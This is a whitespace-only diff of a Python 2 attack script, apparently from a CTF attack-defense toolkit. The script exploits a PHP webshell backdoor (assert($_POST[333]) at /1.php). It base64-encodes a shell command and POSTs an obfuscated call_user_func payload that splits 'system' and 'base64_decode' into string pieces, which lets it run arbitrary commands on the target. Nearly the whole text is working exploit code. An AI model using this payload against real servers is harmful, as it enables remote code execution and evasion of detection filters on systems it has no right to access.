@@ -7,7 +7,7 @@ from urllib import quote
 import traceback
 
 def vulnerable_attack(target,target_port,cmd):
-	
+        
     '''
     this is the payload script for vuln:
 
@@ -15,18 +15,18 @@ def vulnerable_attack(target,target_port,cmd):
     assert($_POST[333]);
     '''
     
-    try:	   
-	cmd = base64.b64encode(cmd)
+    try:           
+        cmd = base64.b64encode(cmd)
         # This payload may not work under some php versions
-	#payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
+        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
         #print payload
         payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
         data = '222=%s'% quote(payload) 
-	res = http("post",target,target_port,"/1.php",data,headers)
+        res = http("post",target,target_port,"/1.php",data,headers)
     except Exception,e:
-	debug_print(traceback.format_exc())	
+        debug_print(traceback.format_exc())     
         dump_error("attack failed",target,"vulnerable attack")
-	res = "error"
+        res = "error"
 
     return res
 
